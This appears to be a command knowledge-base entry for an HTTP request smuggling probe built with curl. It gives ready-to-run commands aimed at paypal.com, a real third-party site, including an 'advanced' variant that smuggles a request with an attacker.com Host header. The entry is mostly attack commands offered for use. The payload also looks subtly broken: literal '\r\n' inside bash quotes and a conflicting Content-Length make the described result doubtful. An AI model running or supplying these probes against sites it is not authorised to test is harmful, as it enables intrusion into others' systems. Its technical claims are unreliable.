---
data: >-
  curl -H "Host: paypal.com" -H "Content-Length: 0" -H "Transfer-Encoding:
  chunked" --data "0\r\nGET /signin HTTP/1.1\r\nHost: paypal.com\r\n\r\n"
  https://paypal.com
tags:
  - http-request-smuggling
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: a3f9343d-a406-4315-bce7-e7a63320fbe3
created_at: '2025-12-11T03:47:59.460Z'
updated_at: '2025-12-11T03:47:59.460Z'
verified: false
validated: true
submitted: true
---
# curl-http-smuggling

## Command

```bash
curl -H "Host: paypal.com" -H "Content-Length: 0" -H "Transfer-Encoding: chunked" --data "0\r\nGET /signin HTTP/1.1\r\nHost: paypal.com\r\n\r\n" https://paypal.com
```

## Description

This command sends an HTTP Request Smuggling probe using cURL to test for vulnerabilities in request parsing, useful for identifying smuggling opportunities in caching servers.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Host: paypal.com"` | Sets the target host | Yes |
| `-H "Content-Length: 0"` | Sets zero content length for smuggling | Yes |
| `-H "Transfer-Encoding: chunked"` | Enables chunked encoding | Yes |
| `--data "..."` | The smuggled request payload | Yes |

## Examples

### Basic Usage

```bash
curl -H "Host: target.com" -H "Content-Length: 0" -H "Transfer-Encoding: chunked" --data "0\r\nGET / HTTP/1.1\r\nHost: target.com\r\n\r\n" https://target.com
```

### Advanced Usage

```bash
curl --proxy http://localhost:8080 -H "Host: paypal.com" -H "Content-Length: 0" -H "Transfer-Encoding: chunked" --data "0\r\nGET /signin HTTP/1.1\r\nHost: attacker.com\r\n\r\n" https://paypal.com
```

## Expected Output

A response indicating desynchronization, such as a 200 OK with smuggled content or an error showing parsing issues.

## Related

- [[commands/burp-request-manipulation]]
- [[procedures/Identify-Caching-Server-Vulnerability]]
